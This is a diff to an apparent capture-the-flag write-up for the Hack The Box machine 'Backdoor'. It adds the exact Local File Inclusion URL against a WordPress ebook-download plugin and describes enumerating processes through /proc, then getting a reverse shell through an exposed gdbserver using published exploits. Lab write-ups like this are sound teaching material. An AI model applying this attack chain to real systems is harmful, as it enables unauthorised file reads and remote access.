@@ -93,7 +93,11 @@ I will download it on my computer using:
 
 `$ searchsploit -m 39575`
 
-If we open the text file, we can see that the plugin is vulnerable to Local File Inclusion.
+If we open the text file, we can see that the plugin is vulnerable to Local File Inclusion,
+using the following url, where _path_ is a valid route in the target machine.
+
+> _http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=path_
+
 We can list running processes using the path /proc/_pid_/cmdline, where pid is a valid process ID.
 Using a Python script to iterate through the PIDs, we can find which are running.
 
@@ -129,7 +133,7 @@ for pid in range(0,5000):
         print("--------------------------------------------\n")
 ```
 
-We see that there's a service called gdbserver running on the open port 1337:
+We see that there's a service called _gdbserver_ running on the open port 1337:
   
 ```bash
 [+] Process 850 found
@@ -137,6 +141,6 @@ b'/proc/850/cmdline/proc/850/cmdline/proc/850/cmdline/bin/sh\x00-c\x00while true
 ```
   
 If we look for it on _searchsploit_ we will find a vulnerability with **id 50539**.
-If we run it and follow the instructions provided, we can get a reverse shell as user and view the flag.
+If we run it and follow the instructions provided, we can get a reverse shell as _user_ and view the flag.
 
 ![whoami output](screenshots/foothold.png)
